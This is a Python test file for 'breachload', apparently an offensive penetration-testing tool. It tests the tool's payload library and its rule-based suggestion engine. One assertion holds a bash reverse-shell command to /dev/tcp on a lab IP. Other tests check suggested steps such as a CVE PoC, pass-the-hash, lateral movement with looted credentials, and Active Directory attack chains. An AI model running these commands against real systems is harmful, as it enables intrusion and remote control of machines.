"""Offline payload library and the rule-based suggestion engine."""

from breachload.analysis.suggest import Suggestion, SuggestionEngine
from breachload.core.state import EngagementState, Finding, Service, Severity
from breachload.exploit.library import PayloadLibrary


class TestPayloadLibrary:
    def setup_method(self):
        self.lib = PayloadLibrary.default()

    def test_loads_entries(self):
        assert len(self.lib.payloads) >= 25
        for p in self.lib.payloads:               # every entry is well-formed
            assert p.id and p.template and p.category

    def test_unique_ids(self):
        ids = [p.id for p in self.lib.payloads]
        assert len(ids) == len(set(ids))

    def test_get_and_render_substitutes(self):
        rendered = self.lib.get("rev-bash").render(LHOST="10.10.14.9", LPORT=4444)
        assert rendered == "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"

    def test_render_leaves_unknown_placeholders(self):
        # rev-bash has no {TARGET}; providing it changes nothing and doesn't error.
        assert "{LHOST}" in self.lib.get("rev-bash").render(TARGET="x")

    def test_render_does_not_choke_on_literal_braces(self):
        # The perl payload contains many symbols; render must not raise.
        assert self.lib.get("rev-perl").render(LHOST="1.2.3.4", LPORT=9001)

    def test_filter_by_category_and_tag_and_platform(self):
        assert all(p.category == "reverse-shell" for p in self.lib.filter(category="reverse-shell"))
        assert all("smb" in p.tags for p in self.lib.filter(tag="smb"))
        # platform filter keeps matching + "any"
        for p in self.lib.filter(platform="windows"):
            assert p.platform in ("windows", "any")

    def test_categories_present(self):
        cats = self.lib.categories()
        assert {"reverse-shell", "privesc-linux", "service", "msfvenom"} <= set(cats)


def _state() -> EngagementState:
    st = EngagementState(name="t")
    h = st.upsert_host("10.10.10.5")
    h.upsert_service(Service(port=21, name="ftp"))
    h.upsert_service(Service(port=80, name="http"))
    h.upsert_service(Service(port=445, name="microsoft-ds"))
    st.add_finding(Finding(title="Apache RCE", severity=Severity.CRITICAL,
                           host="10.10.10.5", cve=["CVE-2021-41773"]))
    st.add_finding(Finding(title="Info banner", severity=Severity.INFO, host="10.10.10.5"))
    return st


class TestSuggestionEngine:
    def setup_method(self):
        self.sug = SuggestionEngine().suggest(_state(), lhost="10.10.14.9", lport=4444)

    def test_returns_prioritized_suggestions(self):
        priorities = [s.priority for s in self.sug]
        assert priorities == sorted(priorities)   # already ordered

    def test_critical_cve_finding_leads_the_non_chain_steps(self):
        # Matched chains outrank everything; among the rest, the critical CVE
        # finding comes first (with its PoC command).
        non_chain = [s for s in self.sug if not s.title.startswith("Chain:")]
        assert "Apache RCE" in non_chain[0].title
        assert any("breachload poc" in a for a in non_chain[0].actions)

    def test_service_suggestions_present(self):
        titles = " ".join(s.title for s in self.sug)
        assert "FTP" in titles and "SMB" in titles and "HTTP" in titles

    def test_payloads_are_rendered_with_context(self):
        blob = "\n".join(a for s in self.sug for a in s.actions)
        assert "10.10.10.5" in blob                # TARGET substituted
        assert "10.10.14.9" in blob                # LHOST substituted in post-shell/rev

    def test_post_shell_step_last(self):
        assert self.sug[-1].title == "Once you have a shell"
        assert any("sudo -l" in a for a in self.sug[-1].actions)

    def test_no_findings_no_cve_still_suggests_services(self):
        st = EngagementState(name="t")
        st.upsert_host("10.10.10.9").upsert_service(Service(port=445, name="microsoft-ds"))
        out = SuggestionEngine().suggest(st)
        assert any("SMB" in s.title for s in out)
        assert isinstance(out[0], Suggestion)

    def test_lateral_movement_when_credentials_exist(self):
        from breachload.core.state import Credential
        st = EngagementState(name="t")
        h = st.upsert_host("10.10.10.5")
        h.upsert_service(Service(port=22, name="ssh"))
        st.credentials.append(Credential(username="bob", secret="Winter2024", kind="password"))
        out = SuggestionEngine().suggest(st, lhost="10.10.14.9")
        lateral = next((s for s in out if "Lateral movement" in s.title), None)
        assert lateral is not None
        blob = "\n".join(lateral.actions)
        assert "bob" in blob and "ssh bob@10.10.10.5" in blob

    def test_pass_the_hash_for_hash_credentials(self):
        from breachload.core.state import Credential
        st = EngagementState(name="t")
        st.upsert_host("10.10.10.9").upsert_service(Service(port=445, name="microsoft-ds"))
        st.credentials.append(Credential(username="admin", secret="aad3b...:31d6c...", kind="hash"))
        out = SuggestionEngine().suggest(st)
        lateral = next(s for s in out if "Lateral movement" in s.title)
        assert any("pass-the-hash" in a for a in lateral.actions)

    def test_ad_chains_autofill_looted_credentials(self):
        from breachload.core.state import Credential, Finding, Severity
        st = EngagementState(name="t")
        h = st.upsert_host("10.10.11.42")
        h.tags += ["dc", "domain:corp.local"]
        h.upsert_service(Service(port=88, name="kerberos-sec"))
        st.add_finding(Finding(title="Active Directory Domain Controller on 10.10.11.42",
                               severity=Severity.INFO, host="10.10.11.42"))
        st.credentials.append(Credential(username="j.doe", secret="Autumn2024!",
                                         kind="password"))
        out = SuggestionEngine().suggest(st, lhost="10.10.14.9")
        blob = "\n".join(a for s in out for a in s.actions if s.title.startswith("Chain:"))
        assert "bloodhound-python" in blob or "--bloodhound" in blob
        assert "certipy find" in blob
        assert "j.doe" in blob and "Autumn2024!" in blob and "corp.local" in blob

    def test_no_lateral_without_credentials(self):
        st = EngagementState(name="t")
        st.upsert_host("10.10.10.5").upsert_service(Service(port=22, name="ssh"))
        out = SuggestionEngine().suggest(st)
        assert not any("Lateral movement" in s.title for s in out)

    def test_matched_chain_outranks_other_suggestions(self):
        st = EngagementState(name="t")
        host = st.upsert_host("10.10.10.9")
        host.os_guess = "Windows 7"
        host.upsert_service(Service(port=445, name="microsoft-ds"))
        out = SuggestionEngine().suggest(st, lhost="10.10.14.9")
        assert out[0].title.startswith("Chain:")     # chain sits above ad-hoc steps
        assert out[0].priority < 0
